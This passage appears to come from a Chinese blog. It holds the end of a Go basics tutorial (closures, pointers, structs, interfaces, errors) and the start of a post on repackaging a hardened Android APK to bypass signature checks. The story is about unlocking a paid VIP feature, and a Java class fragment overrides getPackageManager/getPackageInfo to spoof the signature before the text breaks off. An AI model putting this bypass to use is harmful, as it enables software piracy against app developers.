<code>int</code>。如果你仅仅需要返回值的一部分的话，你可以使用空白标识符 <code>_</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">vals</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>, <span class="hljs-number">7</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    a, b := vals()<br>    fmt.Println(a)<br>    fmt.Println(b)<br><br>    _, c := vals()<br>    fmt.Println(c)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x13-变参"><a href="#0x13-变参" class="headerlink" title="0x13 变参"></a>0x13 变参</h2><p>如果你有一个含有多个值的 slice，想把它们作为参数使用， 你需要这样调用 <code>func(slice...)</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(nums ...<span class="hljs-type">int</span>)</span></span> &#123;<br>    fmt.Print(nums, <span class="hljs-string">&quot; &quot;</span>)<br>    total := <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _, num := <span class="hljs-keyword">range</span> nums &#123;<br>        total += num<br>    &#125;<br>    fmt.Println(total)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    sum(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>    sum(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br><br>    nums := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>    sum(nums...)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run variadic-functions.go</span> <br>[1 2] 3<br>[1 2 3] 6<br>[1 2 3 4] 10<br></code></pre></td></tr></table></figure><h2 id="0x14-闭包"><a href="#0x14-闭包" class="headerlink" title="0x14 闭包"></a>0x14 闭包</h2><p><code>intSeq</code> 函数返回一个在其函数体内定义的匿名函数。 返回的函数使用闭包的方式 <em>隐藏</em> 变量 <code>i</code>。 返回的函数 <em>隐藏</em> 变量 <code>i</code> 以形成闭包。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">intSeq</span><span class="hljs-params">()</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">int</span> &#123;<br>    i := <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">int</span> &#123;<br>        i++<br>        <span class="hljs-keyword">return</span> i<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    nextInt := intSeq()<br><br>    fmt.Println(nextInt())<br>    fmt.Println(nextInt())<br>    fmt.Println(nextInt())<br><br>    newInts := intSeq()<br>    fmt.Println(newInts())<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run closures.go</span><br>1<br>2<br>3<br>1<br></code></pre></td></tr></table></figure><h2 id="0x15-递归"><a href="#0x15-递归" class="headerlink" title="0x15 递归"></a>0x15 递归</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fact</span><span class="hljs-params">(n <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> n * fact(n<span class="hljs-number">-1</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(fact(<span class="hljs-number">7</span>))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x16-指针"><a href="#0x16-指针" class="headerlink" title="0x16 指针"></a>0x16 指针</h2><p>与C类语言相同</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zeroval</span><span class="hljs-params">(ival <span class="hljs-type">int</span>)</span></span> &#123;<br>    ival = <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zeroptr</span><span class="hljs-params">(iptr *<span class="hljs-type">int</span>)</span></span> &#123;<br>    *iptr = <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    i := <span class="hljs-number">1</span><br>    fmt.Println(<span class="hljs-string">&quot;initial:&quot;</span>, i)<br><br>    zeroval(i)<br>    fmt.Println(<span class="hljs-string">&quot;zeroval:&quot;</span>, i)<br><br>    zeroptr(&amp;i)<br>    fmt.Println(<span class="hljs-string">&quot;zeroptr:&quot;</span>, i)<br><br>    fmt.Println(<span class="hljs-string">&quot;pointer:&quot;</span>, &amp;i)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run pointers.go</span><br>initial: 1<br>zeroval: 1<br>zeroptr: 0<br>pointer: 0x42131100<br></code></pre></td></tr></table></figure><h2 id="0x17-结构体"><a href="#0x17-结构体" class="headerlink" title="0x17 结构体"></a>0x17 结构体</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> person <span class="hljs-keyword">struct</span> &#123;<br>    name <span class="hljs-type">string</span><br>    age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    fmt.Println(person&#123;<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">20</span>&#125;)<br><br>    fmt.Println(person&#123;name: <span class="hljs-string">&quot;Alice&quot;</span>, age: <span class="hljs-number">30</span>&#125;)<br><br>    fmt.Println(person&#123;name: <span class="hljs-string">&quot;Fred&quot;</span>&#125;)<br><br>    fmt.Println(&amp;person&#123;name: <span class="hljs-string">&quot;Ann&quot;</span>, age: <span class="hljs-number">40</span>&#125;)<br><br>    s := person&#123;name: <span class="hljs-string">&quot;Sean&quot;</span>, age: <span class="hljs-number">50</span>&#125;<br>    fmt.Println(s.name)<br><br>    sp := &amp;s<br>    fmt.Println(sp.age)<br><br>    sp.age = <span class="hljs-number">51</span><br>    fmt.Println(sp.age)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run structs.go</span><br>&#123;Bob 20&#125;<br>&#123;Alice 30&#125;<br>&#123;Fred 0&#125;<br>&amp;&#123;Ann 40&#125;<br>Sean<br>50<br>51<br></code></pre></td></tr></table></figure><h2 id="0x18-方法"><a href="#0x18-方法" class="headerlink" title="0x18 方法"></a>0x18 方法</h2><p>个人感觉类似于C++里面的class类内的public函数吧</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> rect <span class="hljs-keyword">struct</span> &#123;<br>    width, height <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *rect)</span></span> area() <span class="hljs-type">int</span> &#123;<br>    <span class="hljs-keyword">return</span> r.width * r.height<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r rect)</span></span> perim() <span class="hljs-type">int</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*r.width + <span class="hljs-number">2</span>*r.height<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    r := rect&#123;width: <span class="hljs-number">10</span>, height: <span class="hljs-number">5</span>&#125;<br><br>    fmt.Println(<span class="hljs-string">&quot;area: &quot;</span>, r.area())<br>    fmt.Println(<span class="hljs-string">&quot;perim:&quot;</span>, r.perim())<br><br>    rp := &amp;r<br>    fmt.Println(<span class="hljs-string">&quot;area: &quot;</span>, rp.area())<br>    fmt.Println(<span class="hljs-string">&quot;perim:&quot;</span>, rp.perim())<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run methods.go</span><br>area:  50<br>perim: 30<br>area:  50<br>perim: 30<br></code></pre></td></tr></table></figure><h2 id="0x19-接口"><a href="#0x19-接口" class="headerlink" title="0x19 接口"></a>0x19 接口</h2><p>可以通过接口实现对所有类似抽象问题的求解方法进行集合，从而简化程序的编写逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;math&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> geometry <span class="hljs-keyword">interface</span> &#123;<br>    area() <span class="hljs-type">float64</span><br>    perim() <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-keyword">type</span> rect <span class="hljs-keyword">struct</span> &#123;<br>    width, height <span class="hljs-type">float64</span><br>&#125;<br><span class="hljs-keyword">type</span> circle <span class="hljs-keyword">struct</span> &#123;<br>    radius <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r rect)</span></span> area() <span class="hljs-type">float64</span> &#123;<br>    <span class="hljs-keyword">return</span> r.width * r.height<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r rect)</span></span> perim() <span class="hljs-type">float64</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*r.width + <span class="hljs-number">2</span>*r.height<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c circle)</span></span> area() <span class="hljs-type">float64</span> &#123;<br>    <span class="hljs-keyword">return</span> math.Pi * c.radius * c.radius<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c circle)</span></span> perim() <span class="hljs-type">float64</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * math.Pi * c.radius<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">measure</span><span class="hljs-params">(g geometry)</span></span> &#123;<br>    fmt.Println(g)<br>    fmt.Println(g.area())<br>    fmt.Println(g.perim())<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    r := rect&#123;width: <span class="hljs-number">3</span>, height: <span class="hljs-number">4</span>&#125;<br>    c := circle&#123;radius: <span class="hljs-number">5</span>&#125;<br><br>    measure(r)<br>    measure(c)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run interfaces.go</span><br>&#123;3 4&#125;<br>12<br>14<br>&#123;5&#125;<br>78.53981633974483<br>31.41592653589793<br></code></pre></td></tr></table></figure><h2 id="0x20-错误处理"><a href="#0x20-错误处理" class="headerlink" title="0x20 错误处理"></a>0x20 错误处理</h2><p>符合 Go 语言习惯的做法是使用一个独立、明确的返回值来传递错误信息。 这与 Java、Ruby 使用的异常（exception） 以及在 C 语言中有时用到的重载 (overloaded) 的单返回&#x2F;错误值有着明显的不同。 Go 语言的处理方式能清楚的知道哪个函数返回了错误，并使用跟其他（无异常处理的）语言类似的方式来处理错误。</p><p><code>errors.New</code> 使用给定的错误信息构造一个基本的 <code>error</code> 值。返回错误值为 nil 代表没有错误。还可以通过实现 <code>Error()</code> 方法来自定义 <code>error</code> 类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;errors&quot;</span><br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f1</span><span class="hljs-params">(arg <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">if</span> arg == <span class="hljs-number">42</span> &#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>, errors.New(<span class="hljs-string">&quot;can&#x27;t work with 42&quot;</span>)<br><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> arg + <span class="hljs-number">3</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-keyword">type</span> argError <span class="hljs-keyword">struct</span> &#123;<br>    arg  <span class="hljs-type">int</span><br>    prob <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(e *argError)</span></span> Error() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%d - %s&quot;</span>, e.arg, e.prob)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f2</span><span class="hljs-params">(arg <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">if</span> arg == <span class="hljs-number">42</span> &#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>, &amp;argError&#123;arg, <span class="hljs-string">&quot;can&#x27;t work with it&quot;</span>&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arg + <span class="hljs-number">3</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> []<span class="hljs-type">int</span>&#123;<span class="hljs-number">7</span>, <span class="hljs-number">42</span>&#125; &#123;<br>        <span class="hljs-keyword">if</span> r, e := f1(i); e != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;f1 failed:&quot;</span>, e)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;f1 worked:&quot;</span>, r)<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> []<span class="hljs-type">int</span>&#123;<span class="hljs-number">7</span>, <span class="hljs-number">42</span>&#125; &#123;<br>        <span class="hljs-keyword">if</span> r, e := f2(i); e != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;f2 failed:&quot;</span>, e)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;f2 worked:&quot;</span>, r)<br>        &#125;<br>    &#125;<br><br>    _, e := f2(<span class="hljs-number">42</span>)<br>    <span class="hljs-keyword">if</span> ae, ok := e.(*argError); ok &#123;<br>        fmt.Println(ae.arg)<br>        fmt.Println(ae.prob)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run errors.go</span><br>f1 worked: 10<br>f1 failed: can&#x27;t work with 42<br>f2 worked: 10<br>f2 failed: 42 - can&#x27;t work with it<br>42<br>can&#x27;t work with it<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重打包APK绕过签名校验</title>
      <link href="/2021/09/792658f8.html"/>
      <url>/2021/09/792658f8.html</url>
      
        <content type="html"><![CDATA[<h3 id="这里先提一种针对性校强但简单好理解的办法，纯Java实现，代码大概也就50行不到吧。"><a href="#这里先提一种针对性校强但简单好理解的办法，纯Java实现，代码大概也就50行不到吧。" class="headerlink" title="这里先提一种针对性校强但简单好理解的办法，纯Java实现，代码大概也就50行不到吧。"></a>这里先提一种针对性校强但简单好理解的办法，纯Java实现，代码大概也就50行不到吧。</h3><h3 id="还有更强的并且能过各种保护（反调试反HOOK反内存修改等等）的万能方法，不过较复杂，长篇大论的，等有空整理出来再提"><a href="#还有更强的并且能过各种保护（反调试反HOOK反内存修改等等）的万能方法，不过较复杂，长篇大论的，等有空整理出来再提" class="headerlink" title="还有更强的并且能过各种保护（反调试反HOOK反内存修改等等）的万能方法，不过较复杂，长篇大论的，等有空整理出来再提"></a>还有更强的并且能过各种保护（反调试反HOOK反内存修改等等）的万能方法，不过较复杂，长篇大论的，等有空整理出来再提</h3><h2 id="本文适用场景："><a href="#本文适用场景：" class="headerlink" title="本文适用场景："></a>本文适用场景：</h2><h3 id="1-需要重打包APK给普通用户，没有root权限也没有HOOK框架"><a href="#1-需要重打包APK给普通用户，没有root权限也没有HOOK框架" class="headerlink" title="1.需要重打包APK给普通用户，没有root权限也没有HOOK框架"></a>1.需要重打包APK给普通用户，没有root权限也没有HOOK框架</h3><h3 id="2-so很难脱壳修复分析修改，或者逆向时间会很长很长。"><a href="#2-so很难脱壳修复分析修改，或者逆向时间会很长很长。" class="headerlink" title="2.so很难脱壳修复分析修改，或者逆向时间会很长很长。"></a>2.so很难脱壳修复分析修改，或者逆向时间会很长很长。</h3><h3 id="3-so中调用了this-getPackageManager-getPackageInfo来获取签名进行校验"><a href="#3-so中调用了this-getPackageManager-getPackageInfo来获取签名进行校验" class="headerlink" title="3.so中调用了this.getPackageManager().getPackageInfo来获取签名进行校验"></a>3.so中调用了this.getPackageManager().getPackageInfo来获取签名进行校验</h3><p>故事开始，某天，你暗恋的女神需要某个app的VIP，怎奈你兜兜空空如也，根本买不起VIP，然后你发现这个app的VIP是本地判断的，于是……<br>经过一番折腾，很快就改好了APK，重打包安装运行。提示非法操作？<br>又一番折腾，发现程序主要逻辑在so中，so被混淆的面目全非还进行了加固，最后发现在so中进行了APK签名校验，于是用hook过了签名校验，正常运行，VIP到手。<br>可是这样怎么发给女神呢？女神的手机没有root也没有hook框架。分析so？实在太复杂了，一时半会根本来不及，要让女神等你三五十天？恐怕到时候是备胎都当不成了吧。<br>怎么办？</p><h2 id="总体思路："><a href="#总体思路：" class="headerlink" title="总体思路："></a>总体思路：</h2><p>既然修改so不成，也无法使用hook框架，那么就从别处入手。</p><h3 id="本文用本人曾经悬赏过的加固APK（悬赏期内没人破解成功，加固强度还可以）进行分析："><a href="#本文用本人曾经悬赏过的加固APK（悬赏期内没人破解成功，加固强度还可以）进行分析：" class="headerlink" title="本文用本人曾经悬赏过的加固APK（悬赏期内没人破解成功，加固强度还可以）进行分析："></a>本文用本人曾经悬赏过的加固APK（悬赏期内没人破解成功，加固强度还可以）进行分析：</h3><p>由于so非常复杂，时间关系直接放弃分析。通过HOOK发现so的中签名校验是通过this.getPackageManager().getPackageInfo来获取的，于是想法就来了——<br>这个this是MainActivity的实例，所以这个this是一个很大的突破口：<br>思路活跃的同学可能已经发现了，只要覆盖MainActivity的getPackageManager就行了。</p><h2 id="具体过程如下："><a href="#具体过程如下：" class="headerlink" title="具体过程如下："></a>具体过程如下：</h2><h3 id="1-写一个HookPackageManager，专门用来HOOK各种PM相关方法："><a href="#1-写一个HookPackageManager，专门用来HOOK各种PM相关方法：" class="headerlink" title="1.写一个HookPackageManager，专门用来HOOK各种PM相关方法："></a>1.写一个HookPackageManager，专门用来HOOK各种PM相关方法：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HookPackageManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PackageManager</span> &#123;<br> <br>    <span class="hljs-keyword">private</span> PackageManager mBase; <span class="hljs-comment">//用来做适配，返回其他信息</span><br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HookPackageManager</span><span class="hljs-params">(PackageManager base)</span> &#123;<br>        mBase = base;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PackageInfo <span class="hljs-title function_">getPackageInfo</span><span class="hljs-params">(String packageName, <span class="hljs-type">int</span> 